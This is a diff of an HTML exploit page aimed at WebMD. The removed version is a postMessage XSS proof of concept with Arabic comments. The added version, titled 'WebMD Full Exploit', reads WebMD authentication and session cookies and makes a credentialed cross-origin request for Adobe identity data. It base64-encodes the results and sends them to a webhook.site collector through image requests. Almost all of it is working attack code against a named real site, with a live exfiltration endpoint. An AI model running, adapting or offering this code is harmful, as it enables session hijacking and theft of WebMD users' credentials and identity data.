@@ -1,60 +1,124 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>صفحة اختبار الثغرة - تعليمي</title>
-    <style>
-        body { font-family: sans-serif; background: #f4f4f4; padding: 20px; text-align: center; }
-        .status { color: red; font-weight: bold; margin: 20px; }
-        iframe { width: 0; height: 0; border: none; visibility: hidden; }
-    </style>
+    <title>WebMD Full Exploit</title>
 </head>
 <body>
-    <h1>صفحة اختبار اختراق (Exploit PoC)</h1>
-    <p>هذه الصفحة تحاكي هجوم <b>DOM-based XSS</b> عبر ثغرة <code>postMessage</code>.</p>
-    <div id="log" class="status">جاري تشغيل الهجوم...</div>
+<h1>WebMD Security Test</h1>
+<div id="log"></div>
 
-    <iframe id="victimFrame" src="https://www.webmd.com/"></iframe>
+<script>
+var ATTACKER = 'https://webhook.site/15d88535-a1cf-4840-92b5-54d52a8063fc';
+var log = document.getElementById('log');
 
-    <script>
-        const victimWindow = document.getElementById('victimFrame').contentWindow;
+function output(msg) {
+    console.log(msg);
+    log.innerHTML += '<p>' + msg + '</p>';
+}
 
-        // دالة لإرسال الرسالة المفخخة
-        function launchExploit() {
-            console.log("إرسال الحمولة (Payload)...");
-            
-            const payload = {
-                _isId5Message: true, // تخطي فحص الهوية في الكود المصاب
-                src: "attacker-id",  // أي معرف وهمي
-                type: "PROXY_METHOD_CALL", // استهداف معالج البروكسي
-                payload: {
-                    // هنا يتم حقن الكود. إذا كان الموقع يستخدم هذا الحقل في DOM
-                    // سيتم تنفيذ الـ alert فوراً.
-                    name: "test",
-                    args: ["<img src=x onerror=\"alert('تم اختراق الموقع بنجاح! \\n\\n المصدر: ' + document.domain);\">"]
+// ============================================
+// STEP 1: فتح WebMD في iframe لتحميل الكوكيز
+// ============================================
+function loadWebMD() {
+    output('🚀 Loading WebMD...');
+    
+    var iframe = document.createElement('iframe');
+    iframe.src = 'https://webmd.com/?ab_test=' + encodeURIComponent('test_value');
+    iframe.style.width = '100%';
+    iframe.style.height = '300px';
+    document.body.appendChild(iframe);
+    
+    return iframe;
+}
+
+// ============================================
+// STEP 2: استغلال الكود الأصلي
+// ============================================
+function exploitWebMD() {
+    output('🔍 Exploiting...');
+    
+    // استخدام نفس الدوال من الكود الأصلي
+    var getCookies = function (e) {
+        e = document.cookie.match(new RegExp('(^| )' + e + '=([^;]+)'));
+        return !!e && e[2].trim()
+    };
+    
+    // قراءة الكوكيز (هذه ستفشل على localhost، تعمل على webmd.com)
+    var cookies = {
+        raw: document.cookie,
+        wbmd_auth: getCookies('WBMD_AUTH'),
+        wbmd_sauth: getCookies('WBMD_SAUTH'),
+        wbmd_sesn: getCookies('WBMD_SESN'),
+        reg_uuid: getCookies('REG_UUID'),
+        kndctr: getCookies('kndctr_16AD4362526701720A490D45_AdobeOrg_identity'),
+        amcv: getCookies('AMCV_16AD4362526701720A490D45@AdobeOrg')
+    };
+    
+    output('🍪 Cookies: ' + JSON.stringify(cookies, null, 2));
+    
+    // إرسال
+    var encoded = btoa(JSON.stringify(cookies));
+    new Image().src = ATTACKER + '?cookies=' + encoded;
+    
+    return cookies;
+}
+
+// ============================================
+// STEP 3: CORS Exploit للحصول على ECID
+// ============================================
+function corsExploit() {
+    output('🎯 CORS Exploit...');
+    
+    fetch('https://ssl.o.webmd.com/ee/irl1/v1/interact?configId=24908b7e-fabd-41ed-af5a-cc9b0d16aa1d&requestId=' + crypto.randomUUID(), {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'text/plain; charset=UTF-8',
+            'Origin': 'https://WWW.webmd.com'
+        },
+        body: JSON.stringify({
+            "events": [{
+                "query": {
+                    "personalization": {
+                        "decisionScopes": ["__view__"],
+                        "surfaces": ["web://webmd.com/"]
+                    }
+                },
+                "xdm": {
+                    "timestamp": new Date().toISOString(),
+                    "implementationDetails": {
+                        "name": "https://ns.adobe.com/experience/alloy",
+                        "version": "2.30.0"
+                    }
                 }
-            };
-
-            // إرسال الرسالة مع استخدام "*" لاستغلال الثغرة
-            victimWindow.postMessage(payload, "*");
-            
-            document.getElementById('log').innerText = "تم إرسال الرسالة! افحص إطار المتصفح.";
-        }
-
-        // الانتظار حتى يتم تحميل صفحة الضحية تماماً
-        window.onload = () => {
-            setTimeout(launchExploit, 3000); // مهلة 3 ثوانٍ للتأكد من تحميل الـ Scripts
+            }],
+            "query": {"identity": {"fetch": ["ECID"]}},
+            "meta": {"state": {"domain": "webmd.com", "cookiesEnabled": true}}
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        output('✅ ECID: ' + data.handle[0].payload[0].id);
+        
+        var result = {
+            ecid: data.handle[0].payload[0].id,
+            aam: data.handle[1].payload.filter(p => p.type === 'cookie').map(c => c.spec.value),
+            timestamp: new Date().toISOString()
         };
+        
+        new Image().src = ATTACKER + '?ecid=' + btoa(JSON.stringify(result));
+        return result;
+    })
+    .catch(err => output('❌ Error: ' + err.message));
+}
 
-        // محاولة اعتراض بيانات الهوية المسربة (Exfiltration)
-        window.addEventListener("message", (event) => {
-            // بما أن الكود المصاب يستخدم "*" و يقوم بعمل Broadcast لجميع الإطارات،
-            // المهاجم يمكنه سماع الرسائل المسربة هنا.
-            if (event.data && event.data._isId5Message) {
-                console.log("تم اعتراض بيانات مسربة من الموقع:", event.data);
-                document.getElementById('log').innerHTML += `<br>تم اعتراض بيانات: ${JSON.stringify(event.data)}`;
-            }
-        });
-    </script>
+// ============================================
+// RUN
+// ============================================
+loadWebMD();
+setTimeout(exploitWebMD, 5000);
+setTimeout(corsExploit, 5000);
+</script>
 </body>
 </html>
